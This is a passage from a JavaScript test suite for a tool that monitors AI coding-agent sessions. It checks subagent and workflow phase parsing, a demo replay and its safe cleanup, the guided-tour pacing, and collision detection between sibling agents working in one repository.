  fs.writeFileSync(tmp, line('bb1')); // SAME length — only the inode and the content differ
  fs.renameSync(tmp, p);
  fs.utimesSync(p, T, T); // …and the ORIGINAL timestamps back, so mtime+size say "unchanged"
  const st1 = fs.statSync(p);
  assert.equal(st1.mtimeMs, st0.mtimeMs, 'fixture precondition: the rewrite is mtime-invisible');
  assert.equal(st1.size, st0.size, 'fixture precondition: the rewrite is size-invisible');
  assert.notEqual(st1.ino, st0.ino, 'fixture precondition: rename DID move the inode');

  assert.equal(
    core.parseTranscriptActions(p, { includeSidechain: false })[0].toolUseId,
    'bb1',
    'a derivation computing for the first time reads the CURRENT bytes, not the cached snapshot'
  );
  core.clearFsCache();
});

test('subagents/fleet: phase CONFIDENCE is propagated — heuristic staleness never asserted as truth (0.8.0)', () => {
  freshHome();
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  const S = 'conf';
  fs.mkdirSync(path.join(proj, S, 'subagents'), { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), JSON.stringify(asstToolUse('m1', 'Read', { file_path: '/x.ts' })) + '\n');
  // A subagent with a pending tool_use gone stale >10s → awaiting-permission, but only as a HEURISTIC.
  writePhaseTranscript(path.join(proj, S, 'subagents'), 'agent-s1.jsonl',
    [asstToolUse('t1', 'Bash', { command: 'sleep 99' })], 30_000);
  const subs = core.parseSubagents(cwd, S);
  assert.equal(subs.length, 1);
  assert.equal(subs[0].phase, 'awaiting-permission', 'stale pending tool_use classifies as awaiting-permission');
  assert.equal(subs[0].phaseConfidence, 'heuristic', 'and is LABELED a heuristic — renderers dim it');
  // A sibling's phase carries its confidence too (fresh active tool_use → structural).
  const sibs = core.listSiblings(cwd, S);
  const self = sibs.find((s) => s.id === S);
  assert.equal(self.phase, 'working', 'fresh pending tool_use → working');
  assert.equal(self.phaseConfidence, 'high', 'structural classification → high confidence');
});

test('workflows: running gate uses WORKFLOW_ACTIVE_MS (5m) — a long-thinking agent no longer flaps to done (0.8.0)', () => {
  freshHome();
  const S = 'wffresh';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), '');
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_fresh');
  fs.mkdirSync(wfDir, { recursive: true });
  const mk = (ageMs) => {
    fs.writeFileSync(path.join(wfDir, 'journal.jsonl'), JSON.stringify({ type: 'started', key: 'v2:aaaa', agentId: 'a1' }));
    writePhaseTranscript(wfDir, 'agent-a1.jsonl', [asstToolUse('t1', 'Read', { file_path: '/x.ts' })], ageMs);
    const d = new Date(Date.now() - ageMs);
    fs.utimesSync(path.join(wfDir, 'journal.jsonl'), d, d);
    return core.parseWorkflows(cwd, S)[0];
  };
  const thinking = mk(4 * 60_000); // 4 minutes silent — a long reasoning turn, NOT dead
  assert.equal(thinking.running, true, 'a 4m-silent unfinished run still reads running (was: flapped at 60s)');
  assert.ok(thinking.lastActivityMs > 0, 'lastActivityMs exposes the freshness signal for "active Nm ago"');
  const dead = mk(6 * 60_000); // past the 5m bound — killed/abandoned runs still age out
  assert.equal(dead.running, false, 'a 6m-silent run ages out (killed runs never write completed)');
});

test('workflows: parseScriptMeta survives braces/quotes in string fields; journal keys never fake phases (0.8.0)', () => {
  freshHome();
  const S = 'wfmeta';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), '');
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_meta1');
  fs.mkdirSync(wfDir, { recursive: true });
  const scriptsDir = path.join(proj, S, 'workflows', 'scripts');
  fs.mkdirSync(scriptsDir, { recursive: true });
  // Braces inside strings + comments used to mis-slice the object literal and drop every field.
  fs.writeFileSync(path.join(scriptsDir, 'tricky-wf_meta1.js'), [
    "export const meta = {",
    "  name: 'tricky {run}', // a } in a comment",
    "  description: \"notes {see: docs} and \\\"quoted\\\" bits\",",
    "  /* block } comment */",
    "  phases: [{ title: 'Scan' }, { title: 'Fix' }],",
    "}",
    "phase('Scan')",
  ].join('\n'));
  // Two agents whose journal keys are per-agent-unique and match NO declared phase → identifiers, not
  // phases (the structural belt over the isHashKey regex); a slugged declared key ('phase-scan') sticks.
  fs.writeFileSync(path.join(wfDir, 'journal.jsonl'), [
    JSON.stringify({ type: 'started', key: 'phase-scan', agentId: 'a1' }),
    JSON.stringify({ type: 'started', key: 'zq9x-unique-blob-77', agentId: 'b2' }),
  ].join('\n'));
  writePhaseTranscript(wfDir, 'agent-a1.jsonl', [asstToolUse('t1', 'Read', { file_path: '/x.ts' })]);
  writePhaseTranscript(wfDir, 'agent-b2.jsonl', [asstToolUse('t2', 'Read', { file_path: '/y.ts' })]);
  const w = core.parseWorkflows(cwd, S)[0];
  assert.equal(w.name, 'tricky {run}', 'name parses despite braces in strings');
  assert.equal(w.description, 'notes {see: docs} and "quoted" bits', 'description parses despite braces + escaped quotes');
  assert.deepEqual(w.phases, ['Scan', 'Fix'], 'declared phases parse past the comments');
  const a1 = w.agents.find((a) => a.agentId === 'a1');
  assert.equal(a1.phase, 'phase-scan', 'a key slug-matching a declared phase is trusted');
  const b2 = w.agents.find((a) => a.agentId === 'b2');
  assert.equal(b2.phase, null, 'a per-agent-unique undeclared key is an identifier — never a bogus phase');
});

test('demo: runDemo replays a real-pipeline session — strict task attribution, attributed subagent + workflow, no-residue lifecycle', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork()); // physical path — the demo records under the shell's getcwd()
  const res = await core.runDemo({ fast: true, cwd: ws });
  assert.match(res.session, /^demo-[0-9a-f]{8}$/, 'the demo- prefix gates every demo-only behavior');
  assert.equal(res.edits, 9, 'nine captured store edits across the three prompts');
  assert.ok(fs.existsSync(res.transcript), 'a real transcript in the real project dir');
  assert.equal(res.sibling, null, 'no repo here (tmpWork has no .git) ⇒ no sibling agent is invented');
  assert.equal(res.cancelled, false, 'a run nobody stopped is not reported as cancelled');

  // Every demo edit is strictly attributed — the scenario keeps a to-do in_progress for every edit.
  const m = core.buildChangeMap(ws, res.session, { root: ws });
  assert.ok(!('subtasks' in m), 'no display-subtask layer (0.8.8)');
  assert.ok(m.edits.every((e) => typeof e.taskId === 'string' && e.taskId.length > 0), 'every demo edit sits in a real strict interval');
  // Six task identities, but only five own edits: the sixth is left IN PROGRESS when the replay ends, so
  // the Tasks tab shows work under way rather than only a finished plan. Its in-progress span is a single
  // checkpoint and strict attribution needs a ts strictly inside a span, so it owns nothing — which is
  // why this rollup is unchanged by it, and why that is a fact worth pinning rather than a coincidence.
  assert.equal(m.tasks.length, 6, 'six strict task identities');
  assert.deepEqual(m.rollupByTask.filter((r) => r.taskId !== null).map((r) => r.edits).sort(), [1, 1, 2, 2, 2], 'and five of them claim 2/1/2/1/2 edits');
  assert.ok(m.rollupByTask.every((r) => r.taskId !== null), 'strict model: nothing unassigned either');
  const rows = core.sessionTaskRows(ws, res.session);
  assert.equal(rows.length, 6);
  assert.deepEqual(rows.filter((r) => r.status === 'in_progress').map((r) => r.subject), ['Tune the scaler for sparse columns'], 'exactly one is still under way');

  // The workflow is still in flight when the replay ends — a demo whose every panel shows only the
  // aftermath never shows what running work looks like. It decays to done on its own after five minutes.
  const wfLive = core.parseWorkflows(ws, res.session).find((w) => w.id === 'wf_demo');
  assert.equal(wfLive.running, true, 'the docs run is running');
  assert.deepEqual(wfLive.phaseGroups.map((p) => `${p.title} ${p.done}/${p.total}`), ['Outline 1/1', 'Docs 1/1', 'Review 0/1'], 'with its last phase in flight');

  // Subagent + workflow attribution ride the real windows.
  const subs = core.parseSubagents(ws, res.session);
  assert.equal(subs.length, 1, 'one subagent (the test writer)');
  assert.ok(subs[0].actions.some((a) => a.editId != null), 'its edit is window-attributed to a store record');
  assert.ok(m.workflows.some((w) => w.id === 'wf_demo' && w.rollup.edits === 1), 'the docs workflow owns one edit');
  const wfRun = core.parseWorkflows(ws, res.session).find((w) => w.id === 'wf_demo');
  assert.equal(wfRun.agents.length, 3, 'the docs run is multi-agent');
  assert.deepEqual(wfRun.phaseGroups.map((p) => p.title), ['Outline', 'Docs', 'Review'], 'and multi-phase, in runtime order');

  // The audited surfaces each need live data, or the panel that presents them can only ever render its
  // empty state in the demo — which is the one session anybody browses before installing anything.
  const log = core.readLog(res.session);
  assert.equal(log.filter((r) => r.afterBlob === null).length, 1, 'one DELETION (restore-on-undo, the deletion ghost)');
  assert.equal(log.filter((r) => r.tool === 'Bash').length, 1, 'captured by the Bash tree-diff path, and only that one file');
  assert.equal(m.edits.filter((e) => e.file.endsWith('features.py')).length, 2, 'features.py holds TWO independently reviewable units — undo one, keep the other');
  assert.ok(m.modules.some((x) => x.label === '(external)'), 'the outside-the-workspace write gets its own folder tile');
  const acts = core.parseActions(ws, res.session);
  assert.equal(acts.filter((a) => a.ok === false).length, 1, 'one FAILED tool call for the Actions error filter');
  assert.ok(acts[acts.length - 1].ok !== false, 'never trailing — a trailing error would phase the agent errored for the whole tour');
  assert.equal(core.outsideWrites(acts, ws).length, 1, 'the Risk audit has an outside-the-workspace write to report');
  assert.equal(core.sessionPrompts(ws, res.session).length, 3, 'three of YOUR asks — the Prompts window needs more than one row');
  const procs = core.sessionProcesses(ws, res.session);
  assert.equal(procs.length, 3, 'three background shells');
  assert.deepEqual(
    [procs.some((p) => p.running), procs.some((p) => p.exitCode === 0), procs.some((p) => p.exitCode === 1)],
    [true, true, true],
    'one running, one clean exit, one failure — every state the Processes tab renders'
  );

  // No-residue review: resolve everything → autoClearDemo drops the records; never for a real id.
  for (const r of core.readLog(res.session)) core.setStatus(res.session, r.id, 'kept');
  assert.equal(core.autoClearDemo(res.session), true, 'a fully reviewed demo session clears itself');
  assert.equal(core.readLog(res.session).length, 0, 'store is empty — panels read empty');
  assert.equal(core.autoClearDemo('11111111-2222-3333-4444-555555555555'), false, 'a real session id can never auto-clear');

  // demo --clean removes the transcript, the session tree, the store, the marked workspace, and the
  // scratch dir the one outside-the-workspace write landed in.
  assert.ok(fs.existsSync(path.join(res.scratch, 'profile-report.md')), 'the report is really out there before cleanup');
  const cleaned = core.cleanDemo({ cwd: ws });
  assert.deepEqual(cleaned.sessions, [res.session], 'exactly the demo session is removed');
  assert.deepEqual(cleaned.scratch, [res.scratch], 'and the scratch dir it wrote outside the workspace');
  assert.ok(!fs.existsSync(res.scratch), 'scratch gone');
  assert.ok(!fs.existsSync(res.transcript), 'transcript gone');
  assert.ok(!fs.existsSync(path.join(ws, 'observatory-demo')), 'workspace gone (it carried the marker)');
  // …and a workspace WITHOUT the marker is never deleted, even when pointed at directly.
  const precious = path.join(ws, 'precious');
  fs.mkdirSync(precious, { recursive: true });
  fs.writeFileSync(path.join(precious, 'keep.txt'), 'mine');
  core.cleanDemo({ cwd: ws, dir: precious });
  assert.ok(fs.existsSync(path.join(precious, 'keep.txt')), 'an unmarked directory is never touched');
});

test('tour: autoplay pacing is derived from the text, and clamped at both ends', () => {
  const steps = core.demoTour();
  const dwell = (body, extra = {}) => core.demoStepDwellMs({ id: 'x', title: 't', view: 'edits', body, ...extra });

  // Longer text holds longer — a flat timer would either outrun the dense steps or crawl through the
  // short ones, and these bodies run two to three sentences where the site demo's captions run one.
  assert.ok(dwell('x'.repeat(200)) < dwell('x'.repeat(400)), 'monotonic in length');
  assert.ok(dwell('x'.repeat(400)) < dwell('x'.repeat(600)) || dwell('x'.repeat(400)) === 9000, 'up to the ceiling');
  // Clamped, so nothing flashes past and nothing stalls.
  assert.equal(dwell('short'), 3500, 'the floor');
  assert.equal(dwell('x'.repeat(100000)), 9000, 'the ceiling');
  // The tip and the try line are on screen too, so they count toward the time to read the step.
  assert.ok(dwell('x'.repeat(100), { tip: 'y'.repeat(200) }) > dwell('x'.repeat(100)));

  // Every shipped step gets a real, bounded dwell — a zero would advance instantly and a NaN would hang.
  for (const s of steps) {
    const ms = core.demoStepDwellMs(s);
    assert.ok(Number.isFinite(ms) && ms >= 3500 && ms <= 9000, `${s.id}: ${ms}ms is in range`);
  }
  // And the whole thing is watchable in one sitting rather than a lunch break.
  const total = steps.reduce((n, s) => n + core.demoStepDwellMs(s), 0);
  assert.ok(total < 8 * 60_000, `the full tour plays in under eight minutes (${Math.round(total / 1000)}s)`);
  const short = core.demoTour('essentials').reduce((n, s) => n + core.demoStepDwellMs(s), 0);
  assert.ok(short < 3 * 60_000, `and the short track in under three (${Math.round(short / 1000)}s)`);

  // A wait step's grace before it applies itself — the same nine seconds the site's demo gives its gates.
  assert.equal(core.DEMO_ACTION_COUNTDOWN_MS, 9000);
});

test('tour: demoActionState decides for both editors, including when the demo clears itself', () => {
  const snap = (kept, undone, total, pending = Math.max(0, total - kept - undone)) => ({ kept, undone, pending, total });
  const S = core.demoActionState;

  // Nothing moved.
  assert.equal(S('keep-edit', snap(0, 0, 9), snap(0, 0, 9)), 'waiting');
  // The right counter moved.
  assert.equal(S('keep-edit', snap(0, 0, 9), snap(1, 0, 9)), 'satisfied');
  assert.equal(S('keep-prompt', snap(2, 0, 9), snap(5, 0, 9)), 'satisfied');
  assert.equal(S('keep-task', snap(0, 0, 9), snap(2, 0, 9)), 'satisfied');
  assert.equal(S('undo-edit', snap(0, 0, 9), snap(0, 1, 9)), 'satisfied');
  // The OTHER counter moving is not this step's action.
  assert.equal(S('keep-edit', snap(0, 0, 9), snap(0, 3, 9)), 'waiting');
  assert.equal(S('undo-edit', snap(0, 0, 9), snap(4, 0, 9)), 'waiting');

  // The case that matters. A fully reviewed demo DROPS its records, so `kept` falls to zero — a
  // decrease. A watcher that only looked for "kept went up" would hang exactly when the reader had
  // done the most work, so an emptied log is its own verdict.
  assert.equal(S('keep-edit', snap(4, 0, 9), snap(0, 0, 0)), 'vacated');
  assert.equal(S('undo-edit', snap(0, 2, 9), snap(0, 0, 0)), 'vacated');
  // …and a step armed against a session that never recorded anything resolves immediately rather than
  // waiting forever.
  assert.equal(S('keep-edit', snap(0, 0, 0), snap(0, 0, 0)), 'vacated');

  // …and the second shape of "nothing left to do here": everything resolved, but the records still
  // present (a real session, or a demo whose resolved edits were never cleared). "Accept an edit" then
  // has no edit left to accept, and a step that only watched for "kept went up" would hang forever.
  assert.equal(S('keep-edit', snap(4, 5, 9), snap(4, 5, 9)), 'vacated', 'nothing pending to accept');
  assert.equal(S('keep-prompt', snap(4, 5, 9), snap(4, 5, 9)), 'vacated');
  // Undo is deliberately NOT subject to that: a kept edit can still be reverted.
  assert.equal(S('undo-edit', snap(9, 0, 9), snap(9, 0, 9)), 'waiting', 'a kept edit is still undoable');

  // The kinds the editor performs are never armed as `wait`; if one ever were, waiting is the safe
  // answer — the panel's Skip is always live, so nobody can be trapped.
  assert.equal(S('toggle-spotlight', snap(0, 0, 9), snap(9, 9, 9)), 'waiting');
  assert.equal(S('open-demo-file', snap(0, 0, 9), snap(9, 9, 9)), 'waiting');
});

test('demo: the sibling agent makes a fleet — two rows of one repo, one live collision', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true }); // commonDir resolves ⇒ fleet correlation engages
  const res = await core.runDemo({ fast: true, cwd: ws });
  assert.match(res.sibling, /^demo-[0-9a-f]{8}$/, 'the sibling is simulator-owned too, so cleanup reaches it');

  // The sibling launches from the demo workspace, which walks UP to the SAME .git — a different
  // project dir, the same repo key. That is what puts two rows in one fleet without inventing a repo.
  const fleet = core.listRepoSiblings(ws, res.session);
  assert.equal(fleet.length, 2, 'two agents in this repo');
  const self = fleet.find((s) => s.self);
  const other = fleet.find((s) => !s.self);
  assert.equal(self.id, res.session);
  assert.equal(other.id, res.sibling);
  assert.equal(other.gitBranch, 'demo/hotfix', 'its branch comes from its transcript, not from git');
  assert.notEqual(self.worktree, other.worktree, 'and they report different worktrees');
  assert.ok(!fs.existsSync(path.join(res.workspace, '.git')), 'no .git is fabricated inside the demo workspace');

  // The collision the Fleet badge shows: the SAME absolute path pending on both sides.
  const hits = core.fleetConflicts(fleet);
  assert.equal(hits.length, 1, 'exactly one live collision');
  assert.equal(hits[0].file, path.join(res.workspace, 'src', 'features.py'));
  assert.deepEqual([...hits[0].agents].sort(), [res.session, res.sibling].sort(), 'both agents are named, with no winner picked');

  // Cleanup reaches across BOTH project dirs, and takes the sibling's with it.
  const cleaned = core.cleanDemo({ cwd: ws });
  assert.deepEqual([...cleaned.sessions].sort(), [res.session, res.sibling].sort(), 'both sessions removed');
  assert.ok(!fs.existsSync(core.projectDir(res.workspace)), "the sibling's project dir goes too — it existed only for the demo");
  assert.equal(core.listSessions().length, 0, 'nothing left in the store');
});

test('demo: starting again RESETS — a replay replaces the previous demo, it does not stack on it', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  const first = await core.runDemo({ fast: true, cwd: ws });
  // Review some of it and edit a demo file, the way a presenter would before showing it again.
  core.setStatus(first.session, core.readLog(first.session)[0].id, 'kept');
  fs.writeFileSync(path.join(first.workspace, 'src', 'train.py'), '# scribbled on mid-demo\n');

  const second = await core.runDemo({ fast: true, cwd: ws });
  assert.notEqual(second.session, first.session, 'a fresh session id');
  assert.equal(core.listSessions().length, 1, 'and the previous demo is GONE, not sitting beside it');
  assert.equal(core.listSessions()[0].id, second.session);
  assert.equal(core.readLog(second.session).filter((r) => r.status !== 'pending').length, 0, 'every edit is pending again');
  assert.ok(!fs.readFileSync(path.join(second.workspace, 'src', 'train.py'), 'utf8').includes('scribbled'), 'and the workspace is re-seeded from scratch');

  // The opt-out is there for a caller that deliberately wants two.
  const third = await core.runDemo({ fast: true, cwd: ws, reset: false });
  assert.equal(core.listSessions().length, 2, 'reset:false stacks instead');
  assert.ok([second.session, third.session].every((id) => core.listSessions().some((s) => s.id === id)));
  core.cleanDemo({ cwd: ws });
});

test('demo: the workspace hides itself from git, and a stranded one stays findable', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  const res = await core.runDemo({ fast: true, cwd: ws });

  // The demo writes into the reader's OWN repository. A self-ignoring .gitignore keeps it out of their
  // `git status` and out of `git add -A`, without touching a file they own.
  const ignore = fs.readFileSync(path.join(res.workspace, '.gitignore'), 'utf8');
  assert.match(ignore, /^\*$/m, 'the demo folder ignores itself');

  // A demo must stay findable after session resolution moves on — otherwise the only way out of demo
  // mode disappears the moment the reader talks to Claude again, and the folder is stranded.
  assert.deepEqual(core.demoSessionsFor({ cwd: ws }).sort(), [res.session, res.sibling].filter(Boolean).sort());
  fs.writeFileSync(
    path.join(core.projectDir(ws), '11111111-2222-3333-4444-555555555555.jsonl'),
    JSON.stringify({ type: 'assistant', cwd: ws, message: { role: 'assistant', content: [] } }) + '\n'
  );
  assert.notEqual(core.resolveSessionId(ws), res.session, 'a newer real session is now what resolves');
  assert.ok(core.demoSessionsFor({ cwd: ws }).includes(res.session), 'but the demo is still findable, so Exit can still be offered');

  core.cleanDemo({ cwd: ws });
  assert.deepEqual(core.demoSessionsFor({ cwd: ws }), [], 'and gone once removed');
});

test('demo: it will not adopt — and therefore cannot delete — a directory it did not create', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  // A mistyped --dir used to be catastrophic: the demo planted its sentinel in whatever directory was
  // named, seeded raw over any file whose path the scenario reuses, and then — because a run RESETS —
  // the very next run rm -rf'd the whole thing. The sentinel has to prove prior ownership, not create it.
  const mine = path.join(ws, 'mywork');
  fs.mkdirSync(path.join(mine, 'notes'), { recursive: true });
  fs.writeFileSync(path.join(mine, 'notes', 'thesis.txt'), 'my thesis');
  fs.writeFileSync(path.join(mine, 'src-placeholder'), 'mine');
  await assert.rejects(() => core.runDemo({ fast: true, cwd: ws, dir: mine }), /refusing to use/);
  assert.equal(fs.readFileSync(path.join(mine, 'notes', 'thesis.txt'), 'utf8'), 'my thesis', 'not one byte written');
  assert.ok(!fs.existsSync(path.join(mine, '.observatory-demo')), 'and no sentinel planted to authorize a later delete');

  // An EMPTY directory is fine — the demo creates its own content there and owns it from then on.
  const empty = path.join(ws, 'empty');
  fs.mkdirSync(empty, { recursive: true });
  const res = await core.runDemo({ fast: true, cwd: ws, dir: empty });
  assert.equal(res.workspace, fs.realpathSync(empty));
  // …and re-running is a reset, not a refusal, because it now carries the sentinel.
  await core.runDemo({ fast: true, cwd: ws, dir: empty });
  core.cleanDemo({ cwd: ws, dir: empty });
  assert.ok(!fs.existsSync(empty), 'a demo-owned directory is reclaimed');
});

test('demo: a symlinked workspace resolves to ONE project dir, so the sibling is never orphaned', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true });
  // The sibling records under projectDir(workspace), and a project dir is a mangling of the path
  // STRING — so resolving the workspace one way here and another way in cleanup mints two project dirs
  // and strands the sibling where no command can reach it, while --clean reports success.
  const real = path.join(ws, 'real');
  const link = path.join(ws, 'link');
  fs.mkdirSync(real, { recursive: true });
  fs.symlinkSync(real, link);
  const res = await core.runDemo({ fast: true, cwd: ws, dir: link });
  assert.ok(res.sibling, 'the sibling was created');
  assert.deepEqual(core.demoSessionsFor({ cwd: ws, dir: link }).sort(), [res.session, res.sibling].sort(), 'and is findable through the link');
  // Both transcripts through the link, plus the workflow state file — the point is that the link and the
  // real path resolve to ONE project dir, so nothing is stranded where no command can reach it.
  const beat = core.demoHeartbeat({ cwd: ws, dir: link });
  assert.equal(beat.filter((f) => f.endsWith('.jsonl')).length, 2, 'the heartbeat reaches both agents, so the fleet stays live');
  const cleaned = core.cleanDemo({ cwd: ws, dir: link });
  assert.deepEqual([...cleaned.sessions].sort(), [res.session, res.sibling].sort(), 'and cleanup removes both');
  assert.equal(core.listSessions().length, 0, 'nothing stranded');
});

test('demo: --no-fleet writes exactly one session', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true }); // a repo IS resolvable — the opt-out is what declines
  const res = await core.runDemo({ fast: true, cwd: ws, fleet: false });
  assert.equal(res.sibling, null);
  assert.equal(core.listRepoSiblings(ws, res.session).length, 1, 'just this session');
  core.cleanDemo({ cwd: ws });
});

test('demo: shouldStop halts at a beat boundary and the partial run still cleans up', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  let beats = 0;
  const res = await core.runDemo({ fast: true, cwd: ws, log: () => beats++, shouldStop: () => beats >= 4 });
  assert.equal(res.cancelled, true, 'the result says it was stopped, rather than looking like a short scenario');
  assert.ok(res.steps < 10, 'it really stopped early');
  assert.ok(res.edits < 9, 'so not every edit landed');
  // Whatever DID land is real and reviewable — and removable.
  const cleaned = core.cleanDemo({ cwd: ws });
  assert.deepEqual(cleaned.sessions, [res.session]);
  assert.ok(!fs.existsSync(path.join(ws, 'observatory-demo')), 'a cancelled run leaves no more residue than a complete one');
});

test('demoHeartbeat: bumps every demo transcript and writes nothing', async () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true });
  const res = await core.runDemo({ fast: true, cwd: ws });
  // Backdate both transcripts past the 60s fleet-active window — the state a tour reaches mid-explanation.
  const stale = new Date(Date.now() - 5 * 60 * 1000);
  const paths = [res.transcript, path.join(core.projectDir(res.workspace), `${res.sibling}.jsonl`)];
  const sizes = paths.map((p) => fs.statSync(p).size);
  for (const p of paths) fs.utimesSync(p, stale, stale);
  assert.equal(core.listRepoSiblings(ws, res.session).filter((s) => s.active).length, 0, 'both have gone idle');

  const touched = core.demoHeartbeat({ cwd: ws });
  for (const p of paths) assert.ok(touched.includes(p), 'both demo transcripts, across both project dirs');
  // …and the workflow run's state file, which is what holds the in-flight run inside its own window.
  // ONLY that file: the agent transcripts beside it are watched by the editors, so bumping those would
  // give the heartbeat a self-retriggering loop.
  const stateFile = touched.find((p) => p.endsWith('.json'));
  assert.match(stateFile ?? '', /workflows[/\\]wf_demo\.json$/, 'the workflow state file too');
  assert.equal(touched.filter((p) => p.includes(`${path.sep}subagents${path.sep}`)).length, 0, 'and nothing under subagents/, which the editors watch');
  assert.deepEqual(paths.map((p) => fs.statSync(p).size), sizes, 'touch only — no line is appended and no activity is invented');
  assert.equal(core.listRepoSiblings(ws, res.session).filter((s) => s.active).length, 2, 'and the fleet is live again');
  assert.equal(core.fleetConflicts(core.listRepoSiblings(ws, res.session)).length, 1, 'so the collision badge is back');
  core.cleanDemo({ cwd: ws });
});

test('tour: demoTour is a complete, well-formed script for both editors', () => {
  const steps = core.demoTour();
  // N15: the Edits and Diffs trees are gone — Review is the one review surface, so the closed view
  // set shrank with the product.
  const VIEWS = new Set(['overview', 'prompts', 'review', 'stats', 'fileHistory', 'actions', 'observations', 'editor']);
  const TABS = ['sessions', 'fleet', 'workflows', 'tasks', 'processes'];
  const ANCHORS = new Set([
    'nav-tabs', 'folders-strip', 'files-ledger', 'summary-bar', 'feed', 'nav-axes', 'accept-prompt',
    'session-label', 'spotlight', 'prompts-list', 'session-picker',
    'stats-model', 'stats-compaction', 'stats-tokens', 'stats-cache', 'stats-usage', 'stats-review',
  ]);
  assert.ok(steps.length >= 15, 'a tour of every surface is not a handful of steps');
  assert.equal(new Set(steps.map((s) => s.id)).size, steps.length, 'ids are unique — both editors key on them');
  for (const s of steps) {
    assert.match(s.id, /^[a-z][a-z0-9-]*$/, `${s.id}: kebab id`);
    assert.ok(s.title && s.title.length <= 60, `${s.id}: a title that fits a panel header`);
    assert.ok(s.body && s.body.length >= 40, `${s.id}: a body that says something`);
    assert.ok(!/[<>`]|\*\*/.test(s.body), `${s.id}: plain text — a webview and a Swing label must render it alike`);
    assert.ok(VIEWS.has(s.view), `${s.id}: names a real view`);
    assert.equal(s.view === 'overview', TABS.includes(s.tab), `${s.id}: a tab iff it is an Overview step`);
    if (s.anchor) assert.ok(ANCHORS.has(s.anchor), `${s.id}: anchors must be mappable by both editors`);
    if (s.tip) assert.ok(s.tip.length <= 90, `${s.id}: a tip has to fit beside the thing it describes`);
  }
  // The whole point of the tour: no shipped surface goes unexplained. EVERY view the type admits must
  // have a step — a panel with no step is a panel nobody is told about, and `diffs` was exactly that.
  for (const tab of TABS) assert.ok(steps.some((s) => s.tab === tab), `the Overview's ${tab} tab is explained`);
  for (const view of VIEWS) assert.ok(steps.some((s) => s.view === view), `the ${view} surface is explained`);

  // Action steps: the shape rules that keep the two labels honest.
  const KINDS = new Set(['keep-edit', 'undo-edit', 'keep-prompt', 'keep-task', 'open-demo-file', 'toggle-spotlight']);
  const acts = steps.filter((s) => s.action);
  assert.ok(acts.length >= 4, 'the tour asks the reader to do things');
  for (const s of acts) {
    assert.ok(s.action.mode === 'wait' || s.action.mode === 'auto', `${s.id}: a known mode`);
    assert.ok(KINDS.has(s.action.kind), `${s.id}: a kind both editors can implement`);
    assert.ok(s.action.hint && s.action.hint.length <= 110, `${s.id}: a hint that fits one line`);
    assert.equal(s.action.mode === 'auto', !!s.action.done, `${s.id}: a past-tense line iff the tour did it itself`);
    // Two "do this" lines on one step is exactly the inconsistency the two labels exist to avoid.
    assert.ok(!s.tryIt, `${s.id}: an action step carries no tryIt`);
  }
  for (const mode of ['wait', 'auto']) {
    assert.ok(acts.some((s) => s.action.mode === mode), `the full tour has a ${mode} step`);
    assert.ok(core.demoTour('essentials').some((s) => s.action?.mode === mode), `and so does the short track, so both labels teach themselves`);
  }

  // The short track is a FILTER over the same list, not a second script — so the two can never tell
  // different stories, and a step can never appear in the short tour but not the long one.
  const essentials = core.demoTour('essentials');
  const ids = steps.map((s) => s.id);
  assert.ok(essentials.length >= 8 && essentials.length < steps.length, 'a genuinely shorter track');
  assert.deepEqual(essentials.map((s) => s.id), ids.filter((id) => essentials.some((e) => e.id === id)), 'same order, no reshuffling');
  for (const e of essentials) assert.deepEqual(steps.find((s) => s.id === e.id), e, 'and identical content, not a paraphrase');
  assert.deepEqual(core.demoTour(), steps, 'the default track is everything');
  // The remainder is the exact complement, so finishing the short track can RESUME rather than restart.
  const remainder = core.demoTour('remainder');
  assert.deepEqual(
    [...essentials, ...remainder].map((s) => s.id).sort(),
    ids.slice().sort(),
    'essentials ∪ remainder === everything'
  );
  assert.equal(essentials.filter((e) => remainder.some((r) => r.id === e.id)).length, 0, 'and they are disjoint');
  assert.deepEqual(remainder.map((s) => s.id), ids.filter((id) => !essentials.some((e) => e.id === id)), 'remainder keeps script order');
  assert.deepEqual(core.demoTrackSizes(), { essentials: essentials.length, remainder: remainder.length, everything: steps.length });
  for (const t of ['essentials', 'remainder', 'everything']) {
    assert.match(core.demoTrackBlurb(t), /\S.*\.$/, `${t} has a closing sentence`);
  }
  // Every anchor the type admits is used by some step, and each name belongs to exactly ONE panel —
  // the editors broadcast an anchor to every tour-aware panel, so a shared name would ring two things.
  const used = steps.filter((s) => s.anchor).map((s) => s.anchor);
  for (const a of ANCHORS) assert.ok(used.includes(a), `the ${a} anchor is named by a step`);
  // Which panel OWNS each anchor name. A Prompts anchor filed under 'overview' would not fail today (each
  // name is used once, so the counts still agree) but it would quietly stop catching a future collision.
  const panelOf = (a) =>
    a.startsWith('stats-') ? 'stats' : a === 'prompts-list' || a === 'session-picker' ? 'prompts' : 'overview';
  const byName = new Map();
  for (const a of used) {
    const p = panelOf(a);
    if (byName.has(a)) assert.equal(byName.get(a), p, `${a} is owned by one panel`);
